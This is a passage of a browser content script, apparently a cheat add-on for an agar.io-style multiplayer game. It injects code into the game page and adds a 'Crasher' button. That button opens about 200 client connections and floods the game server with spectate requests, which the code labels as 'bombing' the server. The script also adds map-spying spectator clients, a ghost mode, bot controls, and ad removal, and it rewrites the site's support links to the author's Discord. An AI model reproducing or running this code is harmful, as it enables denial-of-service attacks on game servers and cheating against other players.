    stopBots = document.createElement('button')
    stopBots.type = 'button'
    stopBots.class = 'text-left'
    stopBots.style.fontSize = '15px'
    stopBots.style.width = '220px'
    stopBots.innerText = 'Stop OVH Bots'

    // -----------------------------------------------------------------------------------------------------
    // DOCUMENT DEFINITION
    // -----------------------------------------------------------------------------------------------------

    var menuCheck = setInterval (() => {
        if ($.isReady){ // Wait for the page to be fully loaded
            // Adding elements to Delta menù and events

            toastr.info("Page in ready-state, building elements... 🚧")

            if (document.getElementsByClassName("fcols grow hinherit ")[0]) {
                try{
                    document.getElementsByClassName("fcols grow hinherit ")[0].id = 'button-container'
                }catch(err){toastr.error("CRITICAL: Failed to get button-container");clearInterval(menuCheck);}
                document.getElementById('button-container').appendChild(separator);
                document.getElementById('button-container').appendChild(fullMap);
                document.getElementById('button-container').appendChild(extendedMap);
                document.getElementById('button-container').appendChild(separator2);
                document.getElementById('button-container').appendChild(ghostMode);
                document.getElementById('button-container').appendChild(crasher);
                document.getElementById('button-container').appendChild(crasherLabel);
                document.getElementById('button-container').appendChild(crasherBar);
            }
            document.getElementsByClassName('bmc-top')[0].innerHTML = "Need support? Here's Discord"
            document.getElementsByClassName('col-12 gy-1')[2].querySelector('span').innerHTML = 'greasieball#0856'
            document.getElementsByClassName('col-12 gy-1')[2].querySelector('a').href = 'https://discord.gg/qnWbx2YVdf'
            document.getElementsByClassName('fas fa-mug-hot')[0].innerHTML = '么'
            document.getElementsByClassName('fas fa-mug-hot')[0].className = ''

            MySocket.GUI.divs.maindiv.appendChild(sliderBots);
            MySocket.GUI.divs.maindiv.appendChild(activeBots);
            MySocket.GUI.divs.maindiv.appendChild(refreshBots);
            var sliderCheck = setInterval (() => {
                if(MySocket.player.decoded.botsMax !== undefined){
                    activeBots.innerHTML = `${MySocket.player.decoded.botsMax}`;
                    sliderBots.max = `${MySocket.player.decoded.botsMax}`
                    sliderBots.value = `${MySocket.player.decoded.botsMax}`

                    MySocket.GUI.divs.maindiv.appendChild(stopBots);
                    MySocket.GUI.divs.maindiv.appendChild(botModeOverride);
                    clearInterval(sliderCheck);
                }
            }, 50);

            // -----------------------------------------------------------------------------------------------------
            // REFRESH BOTS <---

            refreshBots.addEventListener('click', function () {refreshOVHSocket();toastr.info("Reloaded OVH Bots Plan ↻")});
            refreshBots.addEventListener('mouseover', (event) => {refreshBots.title = refreshBotsDescription;});

            // -----------------------------------------------------------------------------------------------------
            // STOP OVH BOTS <---

            stopBots.addEventListener('click', function () {MySocket.ws.close();toastr.info("Stopped OVH Bots ⛔")});
            stopBots.addEventListener('mouseover', (event) => {stopBots.title = stopBotsDescription;});

            // -----------------------------------------------------------------------------------------------------
            // ACTIVE BOTS SLIDER <---

            sliderBots.addEventListener('change', function () {sliderOVHReader()});

            // -----------------------------------------------------------------------------------------------------
            // CONTROL BOTS IN SPECTATE MODE <---

            var isdeadCheck = window.isdead
            setInterval (() => {
                if (window.isdead !== isdeadCheck){
                    if(window.isdead){botModeOverride.innerText = 'OVH Spectate Mode: off';toastr.info("Disabled Bots in Spectate Mode 🔴")}else{botModeOverride.innerText = 'OVH Spectate Mode: on';toastr.info("Enabled Bots in Spectate Mode 🟢")}
                    isdeadCheck = window.isdead
                }
            });
            botModeOverride.addEventListener('click', function () {if(window.isdead){window.isdead = false}else{window.isdead = true}});
            botModeOverride.addEventListener('mouseover', (event) => {botModeOverride.title = botModeOverrideDescription;});

            // -----------------------------------------------------------------------------------------------------
            // GHOSTING CELLS <---

            ghostMode.addEventListener('click', function () {
                if(ghostMode.innerHTML == ghostModeOn){ghostMode.innerHTML = ghostModeOff;toastr.info("Disabled GhostMode 🔴");return}
                if(ghostMode.innerHTML == ghostModeOff){ghostMode.innerHTML = ghostModeOn;toastr.info("Enabled GhostMode 🟢");return}
            });
            ghostMode.addEventListener('mouseover', (event) => {ghostMode.title = ghostModeDescription;});
            window.addEventListener('click', (event) => {
                if(app._state.pause && ghostMode.innerHTML == ghostModeOn) {
                    if(app.unitManager.anyPlay) {app.unitManager.activeUnit.target.x = app.unitManager.activeUnit.cursor.x;app.unitManager.activeUnit.target.y = app.unitManager.activeUnit.cursor.y}
                    else{app.master.targetX = app.master.unitManager.units[0].cursor.x;app.master.targetY = app.master.unitManager.units[0].cursor.y}
                }
            });


            // -----------------------------------------------------------------------------------------------------
            // CRASHER <---

            var isCrasherInitialized = false
            crasher.addEventListener('click', async function () {
                if (crasher.innerHTML == crasherOff) {
                    crasher.innerHTML = crasherOn

                    if (!isCrasherInitialized){
                        await initializeClients(200)
                        isCrasherInitialized = true
                    }

                    await sleep(2*1000);
                    app.fcontroller.controllers.spect16x.connect()

                    if (crasher.innerHTML == crasherOn) {crasherLabel.innerHTML = `↪ ᴘᴜʟʟᴇᴅ ꜱᴇʀᴠᴇʀ ɪɴꜰᴏ`}
                    await sleep(1*1000);
                    if (crasher.innerHTML == crasherOn) {crasherLabel.innerHTML = `↪ ɪɴɪᴛɪᴀᴛɪɴɢ ᴄʀᴀꜱʜᴇʀꜱ`}
                    await sleep(1*1000);
                    if (crasher.innerHTML == crasherOn) {crasherLabel.innerHTML = `↪ ʟᴏᴀᴅɪɴɢ ᴄʟɪᴇɴᴛꜱ...`}

                    var crasherCheck,crasherBarCheck = setInterval (await function () {
                        if (crasher.innerHTML == crasherOff){destroyClients()}
                        if (crasher.innerHTML == crasherOn) {
                            crasherBar.value++
                            crasherLabel.innerHTML = `↪ ʟᴏᴀᴅɪɴɢ ᴄʟɪᴇɴᴛꜱ ${crasherBar.value}%`
                        }
                        if (crasherBar.value == crasherBar.max){
                            crasherLabel.innerHTML = `↪ ʙᴏᴍʙɪɴɢ ɪᴘ: ${app._server.serverToken}`
                            crasherCheck = setInterval (async () => {
                                for (let i=0;i<app.fcontroller.controllers.spect16x._clients.length-1;i++) {
                                    if (app.fcontroller.controllers.spect16x._clients[i].socketOpened) {
                                        app.fcontroller.controllers.spect16x._clients[i].sendSpectate()
                                        logClient(app.fcontroller.controllers.spect16x._clients[i].ID,`Enabled spectate mode`)
                                    }else{app.fcontroller.controllers.spect16x._clients[i].connect(app._server.ws)}
                                }
                            });
                        }
                    },900)

                    if (crasher.innerHTML == crasherOff){return}

                    toastr.info("Enabled Crasher 🟢")
                    return;
                }
                if (crasher.innerHTML == crasherOn) {
                    crasher.innerHTML = crasherOff
                    crasherLabel.innerHTML = "↪ ꜱᴛᴀᴛᴜꜱ";
                    crasherBar.value = 0
                    clearInterval(crasherCheck)
                    clearInterval(crasherBarCheck)

                    destroyClients()
                    isCrasherInitialized = false

                    toastr.info("Disabled Crasher 🔴")
                    return;
                }
            });
            crasher.addEventListener('mouseover', (event) => {crasher.title = crasherDescription;});

            // -----------------------------------------------------------------------------------------------------
            // EXTENDED MAP <---

            var bckSpect16x = app.fcontroller.controllers.spect16x._clients
            var isEMInitialized = false
            // Polling for server changes
            extendedMap.addEventListener('click', function() {
                if (extendedMap.innerHTML == extendedMapOff) {
                    extendedMap.innerHTML = extendedMapOn

                    if (!isEMInitialized){
                        initializeClients(coordinatesExtendedMap.length+1)
                        isEMInitialized = true
                    }
                    app.fcontroller.controllers.spect16x.connect()

                    var isEMSocketReady = true
                    var EMsocketStates = setInterval (() => {
                        isEMSocketReady = true
                        for (let i=1;i<app.fcontroller.controllers.spect16x._clients.length-1;i++) {
                            if (app.fcontroller.controllers.spect16x._clients[i].socket.readyState != 1){
                                isEMSocketReady = false
                                logClient(app.fcontroller.controllers.spect16x._clients[i].ID,`Not in ready state, please wait`)
                            }
                        }
                        if (isEMSocketReady){clearInterval(EMsocketStates);}
                    },5*1000);

                    setTimeout (() => {
                        for (let i=0;i<app.fcontroller.controllers.spect16x._clients.length-1;i++) {
                            app.fcontroller.controllers.spect16x._clients[i].sendSpectate()
                            logClient(app.fcontroller.controllers.spect16x._clients[i].ID,`Enabled spectate mode`)
                        }
                    },10*1000)
                    setTimeout (() => {
                        for (let i=1;i<app.fcontroller.controllers.spect16x._clients.length-1;i++) {
                            app.fcontroller.controllers.spect16x._clients[i].sendFreeSpectate()
                            logClient(app.fcontroller.controllers.spect16x._clients[i].ID,`Retargeted spectate mode to FreeSpectate`)
                        }
                    },10*1000)
                    var extendedMapCheck = setInterval (() => {
                        if (extendedMap.innerHTML == extendedMapOff){clearInterval(extendedMapCheck)}
                        coordinatesExtendedMap[0] = {x: app.master.protocol_viewX+2800, y: app.master.protocol_viewY}
                        coordinatesExtendedMap[1] = {x: app.master.protocol_viewX, y: app.master.protocol_viewY+2800}
                        coordinatesExtendedMap[2] = {x: app.master.protocol_viewX-2800, y: app.master.protocol_viewY}
                        coordinatesExtendedMap[3] = {x: app.master.protocol_viewX, y: app.master.protocol_viewY-2800}
                        coordinatesExtendedMap[4] = {x: app.master.protocol_viewX+5600, y: app.master.protocol_viewY+5600}
                        coordinatesExtendedMap[5] = {x: app.master.protocol_viewX+5600, y: app.master.protocol_viewY-5600}
                        coordinatesExtendedMap[6] = {x: app.master.protocol_viewX-5600, y: app.master.protocol_viewY+5600}
                        coordinatesExtendedMap[7] = {x: app.master.protocol_viewX-5600, y: app.master.protocol_viewY-5600}
                        logClient('ALL',`Updated coordinates for extended map`)
                        for (let i=1;i<app.fcontroller.controllers.spect16x._clients.length-1;i++) {
                            setTargetPosition(i,coordinatesExtendedMap[i].x,coordinatesExtendedMap[i].y)
                            logClient(app.fcontroller.controllers.spect16x._clients[i].ID,`Sent to coordinates X:${coordinatesExtendedMap[i].x} + Y:${coordinatesExtendedMap[i].y}`)
                        }
                    },0.5*1000)

                    toastr.info("Enabled Extended Map 🟢")
                    return;
                }
                if (extendedMap.innerHTML == extendedMapOn) {
                    extendedMap.innerHTML = extendedMapOff
                    destroyClients()
                    isEMInitialized = false

                    toastr.info("Disabled Extended Map 🔴")
                    return;
                }
            });
            extendedMap.addEventListener('mouseover', (event) => {extendedMap.title = extendedMapDescription;});

            // -----------------------------------------------------------------------------------------------------
            // FULLMAP <---

            var isInitialized = false
            // Polling for server changes
            var serverCheck = app._server.ws
            setInterval (() => {
                if (app._server.ws !== serverCheck){
                    fullMap.innerHTML = fullMapOff
                    extendedMap.innerHTML = extendedMapOff
                    crasher.innerHTML = crasherOff
                    crasherBar.value = 0

                    app.fcontroller.controllers.spect16x.disconnect()
                    destroyClients()
                    isInitialized = false
                    isEMInitialized = false
                    isCrasherInitialized = false
                    serverCheck = app._server.ws

                    toastr.warning("Restored enviroments to default status 💠")
                }
            });
            fullMap.addEventListener('click', function() {
                if (fullMap.innerHTML == fullMapOff) {
                    fullMap.innerHTML = fullMapOn

                    if (!isInitialized){
                        initializeClients(coordinates.length)
                        isInitialized = true
                    }
                    app.fcontroller.controllers.spect16x.connect()

                    var isSocketReady = true
                    var socketStates = setInterval (() => {
                        isSocketReady = true
                        for (let i=0;i<app.fcontroller.controllers.spect16x._clients.length-1;i++) {
                            if (app.fcontroller.controllers.spect16x._clients[i].socket.readyState != 1){
                                isSocketReady = false
                                logClient(app.fcontroller.controllers.spect16x._clients[i].ID,`Not in ready state, please wait`)
                            }
                        }
                        if (isSocketReady){clearInterval(socketStates);}
                    },5*1000);

                    setTimeout (() => {
                        for (let i=0;i<app.fcontroller.controllers.spect16x._clients.length;i++) {
                            app.fcontroller.controllers.spect16x._clients[i].sendSpectate()
                            logClient(app.fcontroller.controllers.spect16x._clients[i].ID,`Enabled spectate mode`)
                        }
                    },10*1000)
                    setTimeout (() => {
                        for (let i=0;i<app.fcontroller.controllers.spect16x._clients.length;i++) {
                            app.fcontroller.controllers.spect16x._clients[i].sendFreeSpectate()
                            logClient(app.fcontroller.controllers.spect16x._clients[i].ID,`Retargeted spectate mode to FreeSpectate`)
                        }
                    },10*1000)
                    setTimeout (() => {
                        for (let i=0;i<app.fcontroller.controllers.spect16x._clients.length;i++) {
                            setTargetPosition(i,coordinates[i].x,coordinates[i].y)
                            logClient(app.fcontroller.controllers.spect16x._clients[i].ID,`Sent to coordinates X:${coordinates[i].x} + Y:${coordinates[i].y}`)
                        }
                    },10*1000)

                    toastr.info("Enabled Full Map 🟢")
                    return;
                }
                if (fullMap.innerHTML == fullMapOn) {
                    fullMap.innerHTML = fullMapOff
                    destroyClients()
                    isInitialized = false

                    toastr.info("Disabled Full Map 🔴")
                    return;
                }
            });
            fullMap.addEventListener('mouseover', (event) => {fullMap.title = fullmapDescription;});

            // -----------------------------------------------------------------------------------------------------

            removeAdvertisement()
            var botnumCheck = setInterval (() => {
                if (document.getElementById('botnum')) {
                    document.getElementById('botnum').remove()
                    clearInterval(botnumCheck);
                }
            });
            // Clearing interval check and exiting
            signature()
            toastr.info("'Delta Tools Integration by greasieball#0856 ✅")
            clearInterval(menuCheck);
        }
    }, 1*1000);
}

// -----------------------------------------------------------------------------------------------------
// STARTING CONTENT SCRIPT INJECTION
// -----------------------------------------------------------------------------------------------------

try{
    var script = document.createElement('script');
    try{
        script.appendChild(document.createTextNode('('+ main +')();'));
        try{
            (document.body || document.head || document.documentElement).appendChild(script);
        }catch(error){console.error("CRITICAL: Failed to inject scriptblock into webpage")}
    }catch(error){console.error("CRITICAL: Failed to create script TextNode")}
}catch(error){console.error("CRITICAL: Failed to create type Script element")}
